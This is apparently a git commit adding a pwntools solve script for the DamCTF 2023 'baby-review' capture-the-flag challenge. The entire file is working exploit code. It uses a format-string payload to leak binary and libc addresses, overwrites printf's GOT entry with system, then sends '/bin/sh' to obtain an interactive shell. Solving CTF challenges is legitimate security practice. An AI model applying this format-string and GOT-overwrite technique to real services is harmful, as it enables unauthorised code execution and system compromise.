ce2acec980a5de0f71ea2bdf75e3722131a6570c
RenchTG <91157382+RenchTG@users.noreply.github.com>
2023-04-15 13:40:49 -0600

    Add files via upload

---
+++ DamCTF_2023/baby-review/solve.py
@@ -0,0 +1,55 @@
+from pwn import *
+
+elf = context.binary = ELF('./baby-review',checksec=False)
+libc = ELF('libc.so.6',checksec=False)
+#p = process(elf.path)
+#gdb.attach(p)
+p = remote('0.0.0.0',32768)
+
+p.recvline()
+print(p.recvline().decode())
+capital = input()
+#capital = "Paris"
+p.sendline(capital.encode('utf-8'))
+
+p.clean()
+p.sendline(b'5')
+p.recvline()
+payload = b'%9$p %29$p'
+p.sendline(payload)
+p.clean()
+p.sendline(b'2')
+p.recvline()
+p.recvline()
+p.recvline()
+p.recvline()
+p.recvline()
+
+leaks = p.recvline().decode().strip().split(' ')
+binLeak = leaks[0]
+binBase = int(binLeak,16) - elf.symbols['menu'] - 198
+libcLeak = leaks[1]
+libcBase = int(libcLeak,16) - libc.symbols['_IO_2_1_stdout_']
+
+elf.address = binBase
+libc.address = libcBase
+
+p.clean()
+p.sendline(b'5')
+p.clean()
+writes = {
+    elf.got['printf']: libc.symbols['system']
+}
+payload = fmtstr_payload(10, writes)
+p.sendline(payload)
+
+p.clean()
+p.sendline(b'2')
+p.clean()
+p.sendline(b'5')
+p.recvline()
+p.sendline(b'/bin/sh')
+p.clean()
+p.sendline(b'2')
+p.clean()
+p.interactive()
